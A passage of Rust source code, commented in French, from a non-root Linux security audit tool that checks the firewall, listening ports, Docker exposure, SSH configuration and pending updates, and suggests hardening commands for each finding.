//! Audit de sécurité Linux (Arch/Omarchy), sans privilèges root.

use std::fmt::Write;
use std::path::Path;
use std::process::Command;

use super::{Audit, Constat, alerte, cles_ssh, impossible, ok, score, sortie};

/// Ajouts de sentinel à la configuration de sshd (lu en premier : sshd garde la première valeur trouvée).
const SSHD_SENTINEL: &str = "/etc/ssh/sshd_config.d/00-sentinel.conf";
/// Réglages du noyau posés par sentinel, gardés au redémarrage.
const SYSCTL_SENTINEL: &str = "/etc/sysctl.d/99-sentinel.conf";
/// Même fichier sous l'ancien nom (netscan, jusqu'à 0.10.0) : repris puis remplacé à la prochaine correction.
const SYSCTL_ANCIEN: &str = "/etc/sysctl.d/99-netscan.conf";
use crate::risk::{Niveau, info_port};
use crate::{tr, trf, trw};

pub const NOM: &str = "Linux";

/// Gestionnaire de paquets de la distribution : Arch, Debian/Ubuntu/Mint, Fedora, openSUSE.
#[derive(Clone, Copy, PartialEq, Eq)]
pub enum Paquets {
    Pacman,
    Apt,
    Dnf,
    Zypper,
}

impl Paquets {
    pub fn detecter() -> Option<Self> {
        let present = |c: &str| {
            ["/usr/bin", "/bin", "/usr/sbin"]
                .iter()
                .any(|d| Path::new(d).join(c).exists())
        };
        [
            ("pacman", Paquets::Pacman),
            ("apt-get", Paquets::Apt),
            ("dnf", Paquets::Dnf),
            ("zypper", Paquets::Zypper),
        ]
        .into_iter()
        .find_map(|(c, p)| present(c).then_some(p))
    }

    /// Commande d'installation non interactive.
    pub fn installer(self, paquets: &str) -> String {
        match self {
            Paquets::Pacman => format!("sudo pacman -S --needed --noconfirm {paquets}"),
            Paquets::Apt => format!("sudo apt-get install -y {paquets}"),
            Paquets::Dnf => format!("sudo dnf install -y {paquets}"),
            Paquets::Zypper => format!("sudo zypper --non-interactive install {paquets}"),
        }
    }

    /// Le fichier appartient-il à un paquet ? (sinon : ajouté à la main)
    pub fn possede(self, fichier: &Path) -> bool {
        self.proprietaire(fichier).is_some()
    }

    /// Nom du paquet qui a installé ce fichier, `None` s'il a été ajouté à la main.
    pub fn proprietaire(self, fichier: &Path) -> Option<String> {
        let nom = |f: &Path| {
            let arg = f.to_string_lossy();
            match self {
                Paquets::Pacman => sortie("pacman", &["-Qoq", &arg]).map(|s| s.trim().to_string()),
                Paquets::Apt => sortie("dpkg", &["-S", &arg]).and_then(|s| paquet_dpkg(&s)),
                Paquets::Dnf | Paquets::Zypper => sortie("rpm", &["-qf", "--qf", "%{NAME}\\n", &arg])
                    .and_then(|s| s.lines().next().map(str::to_string)),
            }
            .filter(|n| !n.is_empty())
        };
        // /bin, /sbin et /lib sont fusionnés dans /usr sur Debian, Ubuntu et Mint, mais dpkg garde souvent
        // l'ancien chemin : /usr/bin/fusermount3 y est enregistré comme /bin/fusermount3 (vu sur Mint 22).
        nom(fichier).or_else(|| chemin_hors_usr(fichier).and_then(|ancien| nom(&ancien)))
    }

    /// Ces fichiers du paquet ont-ils changé depuis son installation ? Contenu comparé à l'empreinte enregistrée
    /// par le gestionnaire de paquets. `None` pour un fichier qu'on ne peut pas vérifier (illisible, sans empreinte).
    pub fn modifies(self, paquet: &str, fichiers: &[std::path::PathBuf]) -> Vec<Option<bool>> {
        match self {
            Paquets::Pacman => {
                // Empreintes SHA-256 dans le mtree du paquet : ne calcule que les fichiers demandés
                // (pacman -Qkk relirait tout le paquet, des centaines de Mo pour Electron).
                let mtree = sortie("pacman", &["-Q", paquet])
                    .map(|s| s.trim().replace(' ', "-"))
                    .and_then(|dossier| sortie("zcat", &[&format!("/var/lib/pacman/local/{dossier}/mtree")]));
                fichiers
                    .iter()
                    .map(|f| {
                        let attendue = empreinte_mtree(mtree.as_deref()?, f)?;
                        let calculee = sortie("sha256sum", &[&f.to_string_lossy()])?;
                        Some(calculee.split_whitespace().next()? != attendue)
                    })
                    .collect()
            }
            Paquets::Apt | Paquets::Dnf | Paquets::Zypper => {
                // dpkg --verify et rpm -V répondent 1 quand ils trouvent une différence : c'est une réponse, pas une erreur.
                let mut cmd = if self == Paquets::Apt {
                    Command::new("dpkg")
                } else {
                    Command::new("rpm")
                };
                cmd.args(if self == Paquets::Apt {
                    ["--verify", paquet]
                } else {
                    ["-V", paquet]
                })
                .env("LC_ALL", "C");
                let verif = crate::commande::lancer(&mut cmd, 60)
                    .filter(|r| matches!(r.code, Some(0 | 1)))
                    .map(|r| r.sortie);
                fichiers
                    .iter()
                    .map(|f| {
                        let verif = verif.as_deref()?;
                        let ancien = chemin_hors_usr(f);
                        Some(contenu_modifie(verif, f) || ancien.is_some_and(|a| contenu_modifie(verif, &a)))
                    })
                    .collect()
            }
        }
    }

    /// Commande pour remettre les fichiers d'origine d'un paquet.
    pub fn reinstaller(self, paquet: &str) -> String {
        match self {
            Paquets::Pacman => format!("sudo pacman -S --noconfirm {paquet}"),
            Paquets::Apt => format!("sudo apt-get install --reinstall -y {paquet}"),
            Paquets::Dnf => format!("sudo dnf reinstall -y {paquet}"),
            Paquets::Zypper => format!("sudo zypper --non-interactive install -f {paquet}"),
        }
    }

    fn mise_a_jour(self) -> &'static str {
        match self {
            Paquets::Pacman if Path::new("/usr/bin/omarchy").exists() => "omarchy update",
            Paquets::Pacman => "sudo pacman -Syu --noconfirm",
            Paquets::Apt => "sudo apt-get update && sudo apt-get full-upgrade -y",
            Paquets::Dnf => "sudo dnf upgrade -y",
            Paquets::Zypper => "sudo zypper --non-interactive update",
        }
    }
}

/// /usr/bin/x → /bin/x (idem sbin, lib) : chemin d'avant la fusion de /usr.
fn chemin_hors_usr(fichier: &Path) -> Option<std::path::PathBuf> {
    let reste = fichier.strip_prefix("/usr").ok()?;
    ["bin", "sbin", "lib", "lib64"]
        .iter()
        .any(|d| reste.starts_with(d))
        .then(|| Path::new("/").join(reste))
}

/// Paquet donné par « dpkg -S » : « libc6:amd64, libc6-dbg: /chemin » → « libc6:amd64 ». Les lignes
/// « diversion by … » parlent d'un fichier détourné, pas de son propriétaire.
fn paquet_dpkg(texte: &str) -> Option<String> {
    texte
        .lines()
        .filter(|l| !l.starts_with("diversion "))
        .find_map(|l| l.split_once(": ")?.0.split(", ").next().map(str::to_string))
}

/// Empreinte SHA-256 enregistrée pour ce fichier dans le mtree d'un paquet pacman (« ./usr/bin/sudo … sha256digest=… »).
fn empreinte_mtree(mtree: &str, fichier: &Path) -> Option<String> {
    let debut = format!(".{} ", fichier.display());
    mtree
        .lines()
        .find(|l| l.starts_with(&debut))?
        .split_whitespace()
        .find_map(|c| c.strip_prefix("sha256digest="))
        .map(str::to_string)
}

/// Sortie de dpkg --verify ou rpm -V : le 3e caractère vaut « 5 » quand le contenu (empreinte) a changé.
/// Les autres différences (date, droits) ne prouvent pas un remplacement du programme.
fn contenu_modifie(verif: &str, fichier: &Path) -> bool {
    let chemin = fichier.to_string_lossy();
    verif
        .lines()
        .any(|l| l.split_whitespace().last() == Some(&*chemin) && l.chars().nth(2) == Some('5'))
}

/// systemd est-il le gestionnaire de services ? Sans lui (conteneur, Alpine, Void…), on ne peut pas
/// savoir quels services tournent : on le dit au lieu de conclure.
fn systemd() -> bool {
    Path::new("/run/systemd/system").is_dir()
}

pub(crate) fn service_actif(nom: &str) -> bool {
    sortie("systemctl", &["is-active", nom]).is_some_and(|s| s.trim() == "active")
}

fn home() -> String {
    std::env::var("HOME").unwrap_or_default()
}

/// Politique d'entrée par défaut de ufw (ACCEPT, DROP ou REJECT), lue dans /etc/default/ufw.
pub(crate) fn politique_ufw(texte: &str) -> Option<String> {
    texte.lines().find_map(|l| {
        let v = l.trim().strip_prefix("DEFAULT_INPUT_POLICY=")?;
        Some(v.trim_matches('"').to_ascii_uppercase())
    })
}

/// ufw est-il le pare-feu actif ? (les corrections « ufw deny » n'ont de sens qu'avec lui)
pub(crate) fn ufw_actif() -> bool {
    std::fs::read_to_string("/etc/ufw/ufw.conf").is_ok_and(|c| c.lines().any(|l| l.trim() == "ENABLED=yes"))
        && service_actif("ufw")
}

fn pare_feu() -> Constat {
    let installer_ufw = format!(
        "command -v ufw >/dev/null || {}",
        Paquets::detecter().map_or(
            tr!(
                "echo 'Installe ufw avec ta distribution'",
                "echo 'Install ufw with your distribution'"
            )
            .to_string(),
            |g| g.installer("ufw")
        )
    );
    if !systemd() {
        return impossible("Pare-feu", tr!("systemd absent", "systemd missing"));
    }
    if ufw_actif() {
        // Actif ne suffit pas : encore faut-il qu'il bloque les connexions entrantes par défaut.
        let politique = std::fs::read_to_string("/etc/default/ufw")
            .ok()
            .and_then(|t| politique_ufw(&t));
        match politique.as_deref() {
            Some("ACCEPT") => alerte(
                "Pare-feu",
                Niveau::Eleve,
                tr!(
                    "ufw est actif mais accepte toutes les connexions entrantes par défaut : il ne protège rien.",
                    "ufw is running but accepts all incoming connections by default: it protects nothing."
                ),
            )
            .corriger(
                tr!(
                    "Bloquer par défaut les connexions entrantes",
                    "Block incoming connections by default"
                ),
                &["sudo ufw default deny incoming"],
            ),
            Some(p) => ok(
                "Pare-feu",
                trf!(
                    "ufw est actif, entrées refusées par défaut ({p}).",
                    "ufw is running, incoming refused by default ({p})."
                ),
            ),
            None => ok("Pare-feu", tr!("ufw est actif.", "ufw is running.")),
        }
    } else if service_actif("firewalld") {
        // La zone « trusted » laisse tout passer.
        match sortie("firewall-cmd", &["--get-default-zone"]).map(|z| z.trim().to_string()) {
            Some(z) if z == "trusted" => alerte(
                "Pare-feu",
                Niveau::Eleve,
                tr!(
                    "firewalld est actif mais en zone « trusted » : tout est accepté.",
                    "firewalld is running but in the “trusted” zone: everything is accepted."
                ),
            )
            .corriger(
                tr!(
                    "Passer la zone par défaut en « public »",
                    "Set the default zone to “public”"
                ),
                &["sudo firewall-cmd --set-default-zone=public"],
            ),
            Some(z) => ok(
                "Pare-feu",
                trf!(
                    "firewalld est actif (zone « {z} »).",
                    "firewalld is running (zone “{z}”)."
                ),
            ),
            None => ok("Pare-feu", tr!("firewalld est actif.", "firewalld is running.")),
        }
    } else if let Some(s) = ["nftables", "iptables", "ip6tables"]
        .into_iter()
        .find(|s| service_actif(s))
    {
        ok(
            "Pare-feu",
            trf!(
                "{s} est actif (règles non lisibles sans droits root).",
                "{s} is running (rules not readable without root rights)."
            ),
        )
    } else {
        alerte(
            "Pare-feu",
            Niveau::Eleve,
            tr!(
                "Aucun pare-feu actif : tout service ouvert est joignable depuis le réseau.",
                "No firewall running: every open service can be reached from the network."
            ),
        )
        .corriger(
            tr!(
                "Activer ufw : bloquer les connexions entrantes, autoriser les sortantes",
                "Turn ufw on: block incoming connections, allow outgoing ones"
            ),
            &[
                &installer_ufw,
                "sudo ufw default deny incoming",
                "sudo ufw default allow outgoing",
                "sudo ufw --force enable",
                "sudo systemctl enable --now ufw",
            ],
        )
    }
}

/// Services qui écoutent sur le réseau (pas seulement en local), en TCP et en UDP.
/// Adresses joignables depuis un autre appareil : celles des vraies interfaces (Wi-Fi, Ethernet, VPN),
/// au format de `ss` (IPv6 entre crochets). Les ponts virtuels (Docker, libvirt…) ne sont joignables
/// que depuis cette machine.
fn adresses_exposees() -> std::collections::HashSet<String> {
    let virtuelle = |nom: &str| {
        ["lo", "docker", "br-", "virbr", "veth", "podman", "lxc", "vnet"]
            .iter()
            .any(|p| nom.starts_with(p))
    };
    if_addrs::get_if_addrs()
        .into_iter()
        .flatten()
        .filter(|i| !virtuelle(&i.name) && !i.addr.ip().is_loopback())
        .map(|i| match i.addr.ip() {
            std::net::IpAddr::V4(ip) => ip.to_string(),
            std::net::IpAddr::V6(ip) => format!("[{ip}]"),
        })
        .collect()
}

/// `ufw` : le pare-feu actif est ufw. Avec firewalld ou nftables, « ufw deny » ne bloquerait rien
/// (ou s'ajouterait à un ufw arrêté) tout en s'affichant « fait » : on ne le propose pas.
fn ports_ecoute(pare_feu_actif: bool, ufw: bool) -> Vec<Constat> {
    let adresses = adresses_exposees();
    let mut constats = Vec::new();
    let mut vus = Vec::new();
    let mut deja_conseille = std::collections::HashSet::new();
    let bloques = super::ports_bloques();
    for (proto, options) in [("tcp", "-Htlnp"), ("udp", "-Hulnp")] {
        let Some(ss) = sortie("ss", &[options]) else {
            return vec![alerte(
                "Ports en écoute",
                Niveau::Info,
                tr!("Commande ss indisponible.", "ss command unavailable."),
            )];
        };
        for ligne in ss.lines() {
            let c: Vec<&str> = ligne.split_whitespace().collect();
            let Some(local) = c.get(3) else { continue };
            let Some((adresse, port)) = local.rsplit_once(':') else {
                continue;
            };
            let Ok(port) = port.parse::<u16>() else { continue };
            // Zone d'une IPv6 de lien local (« [fe80::1%wlan0] ») : retirée, crochet fermant gardé.
            let sans_zone = match adresse.split_once('%') {
                Some((ip, _)) if adresse.starts_with('[') => format!("{ip}]"),
                Some((ip, _)) => ip.to_string(),
                None => adresse.to_string(),
            };
            let adresse = sans_zone.as_str();
            let expose = matches!(adresse, "0.0.0.0" | "*" | "[::]") || adresses.contains(adresse);
            let i = info_port(port);
            // UDP : client DHCP (68) et ports éphémères anonymes (sockets clientes), ce ne sont pas des services.
            let bruit = proto == "udp" && (port == 68 || (port >= 32768 && i.service == crate::risk::inconnu()));
            if !expose || bruit || vus.contains(&(proto, port)) {
                continue;
            }
            vus.push((proto, port));
            let programme = c
                .get(5)
                .and_then(|u| u.split('"').nth(1))
                .unwrap_or(tr!("programme inconnu (root ?)", "unknown program (root?)"));
            let niveau = super::niveau_expose(pare_feu_actif, i.niveau);
            let constat = alerte(
                "Ports en écoute",
                niveau,
                trf!(
                    "{port}/{proto} ({}) ouvert sur le réseau par « {programme} ». {}",
                    "{port}/{proto} ({}) open to the network by “{programme}”. {}",
                    i.service,
                    i.conseil
                ),
            );
            let deny = format!("sudo ufw deny {port}/{proto}");
            let cle = format!("{port}/{proto}");
            if ufw && bloques.contains(&cle) {
                constats.push(alerte(
                    "Ports en écoute",
                    Niveau::Info,
                    trf!(
                        "{cle} ({}) ouvert par « {programme} », bloqué en entrée par la règle ufw que sentinel a ajoutée (vérifier : sudo ufw status).", "{cle} ({}) opened by “{programme}”, blocked inbound by the ufw rule sentinel added (check: sudo ufw status).",
                        i.service
                    ),
                ));
                continue;
            }
            constats.push(match programme {
                "ollama" => constat.corriger(
                    tr!("Faire écouter Ollama uniquement en local (127.0.0.1)", "Make Ollama listen locally only (127.0.0.1)"),
                    &[
                        "sudo mkdir -p /etc/systemd/system/ollama.service.d",
                        "printf '[Service]\\nEnvironment=OLLAMA_HOST=127.0.0.1\\n' | sudo tee /etc/systemd/system/ollama.service.d/sentinel.conf >/dev/null",
                        "sudo systemctl daemon-reload",
                        "sudo systemctl restart ollama",
                    ],
                ),
                // Un seul conseil par programme, même s'il ouvre un port TCP et un port UDP.
                "steam" if !deja_conseille.insert("steam") => constat,
                "steam" => match remote_play_steam() {
                    // Réglage déjà coupé : le port vient d'un Steam pas redémarré, ou de sa découverte locale.
                    Some(false) => constat.manuel(
                        tr!("Remote Play est déjà désactivé dans Steam, mais Steam garde le port qu'il a ouvert au démarrage : \
                         quitte complètement Steam et relance-le. S'il reste ouvert, c'est la découverte des autres PC Steam \
                         du réseau ; ton pare-feu le bloque de toute façon", "Remote Play is already off in Steam, but Steam keeps the port it opened at startup: \
                         quit Steam completely and start it again. If it stays open, it is the discovery of the other Steam PCs \
                         on the network; your firewall blocks it anyway"),
                        &[],
                    ),
                    _ => constat.manuel(
                        tr!("Si tu n'utilises pas Remote Play : Steam > Paramètres > Remote Play > décocher « Activer Remote Play »", "If you do not use Remote Play: Steam > Settings > Remote Play > uncheck “Enable Remote Play”"),
                        &[],
                    ),
                },
                _ if niveau >= Niveau::Moyen && ufw => {
                    constat
                        .corriger(trf!("Bloquer le port {port}/{proto} dans le pare-feu", "Block port {port}/{proto} in the firewall"), &[&deny])
                        .bloquant(cle)
                }
                _ => constat,
            });
        }
    }
    if constats.is_empty() {
        constats.push(ok(
            "Ports en écoute",
            tr!(
                "Aucun service TCP ou UDP exposé au réseau (tout écoute en local).",
                "No TCP or UDP service exposed to the network (everything listens locally)."
            ),
        ));
    }
    constats
}

/// Remote Play est-il activé dans Steam ? Lu dans le réglage « EnableStreaming » de chaque compte Steam.
/// `None` si le réglage est introuvable (Steam absent ou jamais configuré).
fn remote_play_steam() -> Option<bool> {
    let maison = Path::new(&home()).to_path_buf();
    let valeurs: Vec<bool> = [".steam/steam/userdata", ".local/share/Steam/userdata"]
        .iter()
        .filter_map(|d| std::fs::read_dir(maison.join(d)).ok())
        .flatten()
        .flatten()
        .filter_map(|compte| std::fs::read_to_string(compte.path().join("config/localconfig.vdf")).ok())
        .filter_map(|t| enable_streaming(&t))
        .collect();
    (!valeurs.is_empty()).then(|| valeurs.iter().any(|v| *v))
}

/// Valeur de « EnableStreaming » dans un fichier de réglages Steam (format VDF : "clé"<tab>"valeur").
fn enable_streaming(vdf: &str) -> Option<bool> {
    vdf.lines().find_map(|l| {
        let mut champs = l.split('"').filter(|c| !c.trim().is_empty());
        (champs.next()? == "EnableStreaming").then(|| champs.next() == Some("1"))
    })
}

/// Ports de conteneurs joignables depuis le réseau, dans la colonne « Ports » de `docker ps` : tout sauf la
/// boucle locale (127.x, ::1). Une IP du réseau local (`-p 10.0.0.5:8080:80`) est aussi exposée.
/// Ex. « 0.0.0.0:8080->80/tcp, [::]:8080->80/tcp, 127.0.0.1:3389->3389/tcp » → [« 8080/tcp »].
fn ports_docker_exposes(colonne: &str) -> Vec<String> {
    let mut ports: Vec<String> = colonne
        .split(", ")
        .filter_map(|p| {
            let (hote, _) = p.split_once("->")?;
            let (adresse, port) = hote.rsplit_once(':')?;
            let proto = p.rsplit_once('/').map_or("tcp", |(_, pr)| pr);
            let ip = adresse.trim_matches(|c| c == '[' || c == ']');
            let locale = ip.parse::<std::net::IpAddr>().is_ok_and(|a| a.is_loopback());
            (!locale).then(|| format!("{port}/{proto}"))
        })
        .collect();
    ports.dedup();
    ports
}

/// Docker écrit ses propres règles et passe devant ufw : un port publié sur 0.0.0.0 est joignable
/// depuis le réseau même avec le pare-feu actif.
fn docker() -> Vec<Constat> {
    if !["/usr/bin/docker", "/bin/docker", "/usr/local/bin/docker"]
        .iter()
        .any(|d| Path::new(d).exists())
    {
        return vec![];
    }
    let Some(liste) = sortie_delai("docker", &["ps", "--format", "{{.Names}}\t{{.Ports}}"], 15, &[0]) else {
        return vec![docker_sans_acces(&processus())];
    };
    let mut constats = Vec::new();
    let mut actifs = 0;
    for ligne in liste.lines() {
        let (nom, colonne) = ligne.split_once('\t').unwrap_or((ligne, ""));
        actifs += 1;
        let exposes = ports_docker_exposes(colonne);
        if exposes.is_empty() {
            continue;
        }
        constats.push(
            alerte(
                "Docker",
                Niveau::Eleve,
                trf!(
                    "Conteneur « {nom} » : port(s) {} publié(s) hors de la boucle locale. Docker passe devant le pare-feu : joignable(s) depuis le réseau.", "Container “{nom}”: port(s) {} published outside the loopback. Docker bypasses the firewall: reachable from the network.",
                    exposes.join(", ")
                ),
            )
            .manuel(
                tr!("Publier seulement en local, puis recréer le conteneur : -p 127.0.0.1:PORT:PORT, ou dans docker-compose « \"127.0.0.1:PORT:PORT\" »", "Publish locally only, then recreate the container: -p 127.0.0.1:PORT:PORT, or in docker-compose “\"127.0.0.1:PORT:PORT\"”"),
                &[],
            ),
        );
    }
    if constats.is_empty() {
        constats.push(ok(
            "Docker",
            trf!(
                "Aucun port de conteneur exposé au réseau ({actifs} conteneur(s) actif(s)).",
                "No container port exposed to the network ({actifs} running container(s))."
            ),
        ));
    }
    constats
}

/// Nom et ligne de commande de chaque processus, lus dans /proc (lisible par tous, sauf montage « hidepid »).
fn processus() -> Vec<(String, Vec<String>)> {
    std::fs::read_dir("/proc")
        .into_iter()
        .flatten()
        .flatten()
        .filter(|e| e.file_name().to_string_lossy().bytes().all(|o| o.is_ascii_digit()))
        .filter_map(|e| {
            let nom = std::fs::read_to_string(e.path().join("comm")).ok()?.trim().to_string();
            let args = std::fs::read(e.path().join("cmdline"))
                .unwrap_or_default()
                .split(|&o| o == 0)
                .filter(|a| !a.is_empty())
                .map(|a| String::from_utf8_lossy(a).into_owned())
                .collect();
            Some((nom, args))
        })
        .collect()
}

/// Port publié par un processus docker-proxy : (adresse de l'hôte, « 8080/tcp »).
/// Ligne de commande : « -proto tcp -host-ip 0.0.0.0 -host-port 8080 -container-ip 172.17.0.2 -container-port 80 ».
fn port_docker_proxy(args: &[String]) -> Option<(String, String)> {
    let valeur = |cle: &str| {
        args.iter()
            .position(|a| a == cle)
            .and_then(|i| args.get(i + 1))
            .cloned()
    };
    let proto = valeur("-proto").unwrap_or_else(|| "tcp".into());
    Some((valeur("-host-ip")?, format!("{}/{proto}", valeur("-host-port")?)))
}

/// Docker sans accès au démon (on n'est pas dans le groupe docker, et c'est mieux ainsi : ce groupe vaut root).
/// Les processus restent visibles : un « containerd-shim » par conteneur actif, un « docker-proxy » par port publié,
/// avec l'adresse et le port dans sa ligne de commande. De quoi conclure dans la plupart des cas.
fn docker_sans_acces(procs: &[(String, Vec<String>)]) -> Constat {
    // /proc masqué (hidepid) : on ne verrait aucun processus d'un autre compte, donc on ne conclut rien.
    if !procs.iter().any(|(n, _)| n == "dockerd") {
        return impossible(
            "Docker",
            tr!(
                "démon arrêté ou processus d'un autre compte masqués",
                "daemon stopped or processes of another account hidden"
            ),
        );
    }
    let conteneurs = procs.iter().filter(|(n, _)| n.starts_with("containerd-shim")).count();
    if conteneurs == 0 {
        return ok("Docker", tr!("Aucun conteneur actif.", "No running container."));
    }
    let mut exposes: Vec<String> = procs
        .iter()
        .filter(|(n, _)| n == "docker-proxy")
        .filter_map(|(_, args)| port_docker_proxy(args))
        .filter(|(ip, _)| {
            !ip.trim_matches(|c| c == '[' || c == ']')
                .parse::<std::net::IpAddr>()
                .is_ok_and(|a| a.is_loopback())
        })
        .map(|(_, port)| port)
        .collect();
    exposes.sort();
    exposes.dedup();
    if !exposes.is_empty() {
        return alerte(
            "Docker",
            Niveau::Eleve,
            trf!(
                "{conteneurs} conteneur(s) actif(s), port(s) {} publié(s) hors de la boucle locale. Docker passe devant le pare-feu : joignable(s) depuis le réseau.", "{conteneurs} running container(s), port(s) {} published outside the loopback. Docker bypasses the firewall: reachable from the network.",
                exposes.join(", ")
            ),
        )
        .manuel(
            tr!("Publier seulement en local, puis recréer le conteneur : -p 127.0.0.1:PORT:PORT, ou dans docker-compose « \"127.0.0.1:PORT:PORT\" »", "Publish locally only, then recreate the container: -p 127.0.0.1:PORT:PORT, or in docker-compose “\"127.0.0.1:PORT:PORT\"”"),
            &[],
        );
    }
    // Sans docker-proxy, un port publié passe seulement par le pare-feu de Docker, illisible sans root.
    let sans_proxy = std::fs::read_to_string("/etc/docker/daemon.json")
        .is_ok_and(|t| t.replace(' ', "").contains("\"userland-proxy\":false"));
    if sans_proxy {
        impossible(
            "Docker",
            tr!(
                "conteneurs actifs et userland-proxy coupé : ports publiés illisibles sans le groupe docker",
                "running containers and userland-proxy off: published ports unreadable without the docker group"
            ),
        )
    } else {
        ok(
            "Docker",
            trf!(
                "{conteneurs} conteneur(s) actif(s), aucun port publié hors de la boucle locale.",
                "{conteneurs} running container(s), no port published outside the loopback."
            ),
        )
    }
}

fn ssh_serveur() -> Constat {
    if !systemd() {
        return impossible("SSH", tr!("systemd absent", "systemd missing"));
    }
    // « sshd » sur Arch et Fedora, « ssh » sur Debian, Ubuntu et Mint. Ubuntu (22.10+) le lance à la demande
    // par ssh.socket : le service paraît arrêté alors que le port 22 accepte les connexions.
    if !["sshd", "ssh", "sshd.socket", "ssh.socket"]
        .iter()
        .any(|s| service_actif(s))
    {
        return ok("SSH", tr!("Serveur SSH désactivé.", "SSH server off."));
    }
    let mut conf = String::new();
    // sshd garde la première valeur trouvée ; sur Arch, les fichiers .d sont inclus avant le reste.
    if let Ok(dir) = std::fs::read_dir("/etc/ssh/sshd_config.d") {
        let mut fichiers: Vec<_> = dir.flatten().map(|f| f.path()).collect();
        fichiers.sort();
        for f in fichiers {
            conf += &std::fs::read_to_string(f).unwrap_or_default();
        }
    }
    conf += &std::fs::read_to_string("/etc/ssh/sshd_config").unwrap_or_default();
    let valeur = |cle: &str| {
        conf.lines()
            .map(str::trim)
            .filter(|l| !l.starts_with('#'))
            .find_map(|l| {
                let (k, v) = l.split_once(char::is_whitespace)?;
                k.eq_ignore_ascii_case(cle).then(|| v.trim().to_ascii_lowercase())
            })
    };
    if valeur("PermitRootLogin").as_deref() == Some("yes") {
        return alerte(
            "SSH",
            Niveau::Eleve,
            tr!("Connexion root autorisée en SSH.", "Root login allowed over SSH."),
        )
        .corriger(
            tr!("Interdire la connexion SSH en root", "Forbid root login over SSH"),
            &[
                &format!("echo 'PermitRootLogin no' | sudo tee -a {SSHD_SENTINEL} >/dev/null"),
                "sudo sshd -t && sudo systemctl reload sshd",
            ],
        );
    }
    if valeur("PasswordAuthentication").as_deref() != Some("no") {
        let a_des_cles = std::fs::metadata(format!("{}/.ssh/authorized_keys", home())).is_ok_and(|m| m.len() > 0);
        let c = alerte(
            "SSH",
            Niveau::Moyen,
            tr!(
                "Connexion SSH par mot de passe permise (vulnérable au brute force).",
                "SSH password login allowed (vulnerable to brute force)."
            ),
        );
        return if a_des_cles {
            c.corriger(
                tr!("N'accepter que les clés SSH (tu as déjà des clés autorisées)", "Accept SSH keys only (you already have authorized keys)"),
                &[
                    &format!("printf 'PasswordAuthentication no\\nKbdInteractiveAuthentication no\\n' | sudo tee -a {SSHD_SENTINEL} >/dev/null"),
                    "sudo sshd -t && sudo systemctl reload sshd",
                ],
            )
        } else {
            // Sans clé autorisée, couper les mots de passe t'enfermerait dehors.
            c.manuel(
                tr!("Ajoute d'abord ta clé depuis l'autre ordinateur (ssh-copy-id), puis relance la correction. Ou désactive SSH si inutile :", "First add your key from the other computer (ssh-copy-id), then run the fix again. Or turn SSH off if unused:"),
                &["sudo systemctl disable --now sshd"],
            )
        };
    }
    ok(
        "SSH",
        tr!(
            "Serveur SSH actif, clés uniquement, root interdit.",
            "SSH server running, keys only, root forbidden."
        ),
    )
}

/// Paquets à mettre à jour, un par ligne commençant par son nom ; `None` si on ne peut pas savoir.
fn liste_mises_a_jour(gestion: Paquets) -> Option<Vec<String>> {
    // Ces outils interrogent les dépôts : hors ligne ou serveur lent, ils ne doivent pas figer l'audit.
    let lancer =
        |cmd: &str, args: &[&str]| crate::commande::lancer(Command::new(cmd).args(args).env("LC_ALL", "C"), 120);
    let lignes = |t: &str| t.lines().map(str::to_string).collect::<Vec<_>>();
    match gestion {
        // checkupdates : 0 = mises à jour listées, 2 = rien à faire, autre = erreur (hors ligne…).
        Paquets::Pacman => {
            let r = lancer("checkupdates", &[])?;
            match r.code {
                Some(0) => Some(lignes(&r.sortie)),
                Some(2) => Some(vec![]),
                _ => None,
            }
        }
        // Sorties en anglais (LC_ALL=C) : sinon les mots cherchés changent selon la langue du système.
        // Lit le cache d'apt sans le rafraîchir (il faudrait sudo) : il date du dernier « apt update ».
        // Sans cache, « rien à mettre à jour » ne voudrait rien dire.
        Paquets::Apt => {
            age_cache_apt()?;
            let r = lancer("apt", &["list", "--upgradable"])?;
            (r.code == Some(0)).then(|| {
                lignes(&r.sortie)
                    .into_iter()
                    .filter(|l| l.contains("[upgradable"))
                    .collect()
            })
        }
        // dnf check-update : 100 = mises à jour disponibles, 0 = rien, autre = erreur.
        Paquets::Dnf => {
            let r = lancer("dnf", &["-q", "check-update"])?;
            match r.code {
                Some(100) => Some(
                    lignes(&r.sortie)
                        .into_iter()
                        .filter(|l| !l.trim().is_empty() && !l.starts_with(' '))
                        .collect(),
                ),
                Some(0) => Some(vec![]),
                _ => None,
            }
        }
        Paquets::Zypper => {
            let r = lancer("zypper", &["-q", "list-updates"])?;
            (r.code == Some(0)).then(|| lignes(&r.sortie).into_iter().filter(|l| l.starts_with("v ")).collect())
        }
    }
}

/// Lance une commande avec un délai maximal (sources réseau lentes). `None` si elle dépasse le délai ou si
/// son code de retour n'est pas dans `codes_ok` : une commande en échec ne doit jamais passer pour « rien à signaler »
/// (vu en test : Docker inaccessible donnait « aucun port exposé »). Certains outils répondent « rien à faire »
/// par un code non nul (yay -Qua : 1) : on les liste explicitement.
fn sortie_delai(cmd: &str, args: &[&str], secondes: u64, codes_ok: &[i32]) -> Option<String> {
    let r = crate::commande::lancer(Command::new(cmd).args(args), secondes)?;
    r.code.is_some_and(|c| codes_ok.contains(&c)).then_some(r.sortie)
}

/// Logiciels installés hors du gestionnaire de paquets principal : Flatpak, Snap, AUR et firmware.
fn autres_mises_a_jour() -> Vec<Constat> {
    let present = |c: &str| {
        ["/usr/bin", "/bin", "/usr/local/bin"]
            .iter()
            .any(|d| Path::new(d).join(c).exists())
    };
    let lignes = |t: &str| t.lines().filter(|l| !l.trim().is_empty()).count();
    let mut constats = Vec::new();
    std::thread::scope(|portee| {
        let flatpak = present("flatpak").then(|| {
            portee.spawn(|| {
                sortie_delai(
                    "flatpak",
                    &["remote-ls", "--updates", "--columns=application"],
                    40,
                    &[0],
                )
            })
        });
        let snap = present("snap").then(|| portee.spawn(|| sortie_delai("snap", &["refresh", "--list"], 30, &[0])));
        let aur = ["yay", "paru"]
            .into_iter()
            .find(|c| present(c))
            .map(|c| (c, portee.spawn(move || sortie_delai(c, &["-Qua"], 40, &[0, 1]))));
        let firmware = present("fwupdmgr").then(|| {
            portee.spawn(|| {
                sortie_delai(
                    "fwupdmgr",
                    &["get-updates", "--json", "--no-unreported-check"],
                    40,
                    &[0, 2],
                )
            })
        });

        if let Some(t) = flatpak {
            constats.push(match t.join().ok().flatten() {
                None => impossible("Flatpak", tr!("hors ligne ?", "offline?")),
                Some(l) if lignes(&l) == 0 => ok(
                    "Flatpak",
                    tr!("Applications Flatpak à jour.", "Flatpak apps up to date."),
                ),
                Some(l) => alerte(
                    "Flatpak",
